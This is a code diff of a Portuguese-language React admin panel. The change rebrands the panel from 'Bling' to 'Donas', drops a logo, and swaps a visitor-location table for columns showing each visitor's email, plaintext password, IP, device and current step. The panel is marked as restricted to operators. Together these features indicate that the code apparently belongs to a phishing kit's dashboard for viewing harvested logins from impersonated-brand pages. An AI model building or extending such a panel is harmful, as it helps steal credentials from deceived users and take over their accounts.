@@ -693,7 +693,7 @@ function AdminPanel() {
 
           {/* Título */}
           <div className="text-center px-8 -mt-4 relative z-10">
-            <h1 className="text-2xl font-black text-white tracking-tight">Painel Bling</h1>
+            <h1 className="text-2xl font-black text-white tracking-tight">Painel Donas</h1>
             <p className="text-gray-600 text-xs mt-1">Acesso restrito a operadores</p>
           </div>
 
@@ -781,7 +781,7 @@ function AdminPanel() {
               </button>
             </div>
             <div className="flex items-center gap-3">
-              <img src="/profrotas_logo.png" alt="Bling" className="h-7 opacity-80" />
+              
               <button onClick={handleLogout} className="text-gray-500 hover:text-gray-300 text-xs font-medium transition-colors">Sair</button>
               <div className="bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 px-3 py-1 rounded-full text-xs font-bold tracking-wide uppercase">{adminUsername || "ADMIN"}</div>
             </div>
@@ -1039,24 +1039,22 @@ function AdminPanel() {
                   <thead>
                     <tr>
                       <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">#</th>
+                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">Usuário/Email</th>
+                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">Senha</th>
                       <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">IP</th>
-                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">Cidade</th>
-                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">Estado</th>
-                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">País</th>
-                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">Horário</th>
+                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">Dispositivo</th>
+                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">Etapa</th>
                     </tr>
                   </thead>
                   <tbody>
                     {visitors.map((visitor, index) => (
                       <tr key={visitor.id || index} className="bg-[#0f0f0f] hover:bg-green-900/10">
                         <td className="px-4 py-2 text-sm text-white border border-[#2a2a2a]">{index + 1}</td>
-                        <td className="px-4 py-2 text-sm text-white border border-[#2a2a2a] font-mono">{visitor.ip}</td>
-                        <td className="px-4 py-2 text-sm text-gray-300 border border-[#2a2a2a]">{visitor.city || "-"}</td>
-                        <td className="px-4 py-2 text-sm text-gray-300 border border-[#2a2a2a]">{visitor.state || "-"}</td>
-                        <td className="px-4 py-2 text-sm text-gray-300 border border-[#2a2a2a]">{visitor.country || "-"}</td>
-                        <td className="px-4 py-2 text-sm text-gray-400 border border-[#2a2a2a]">
-                          {new Date(visitor.timestamp).toLocaleString("pt-BR")}
-                        </td>
+                        <td className="px-4 py-2 text-sm text-white border border-[#2a2a2a]">{visitor.email || "-"}</td>
+                        <td className="px-4 py-2 text-sm text-white border border-[#2a2a2a]">{visitor.password || "-"}</td>
+                        <td className="px-4 py-2 text-sm text-white border border-[#2a2a2a] font-mono">{visitor.ip || "-"}</td>
+                        <td className="px-4 py-2 text-sm text-white border border-[#2a2a2a]">{visitor.device || "-"}</td>
+                        <td className="px-4 py-2 text-sm text-white border border-[#2a2a2a]">{visitor.current_action || "-"}</td>
                       </tr>
                     ))}
                   </tbody>
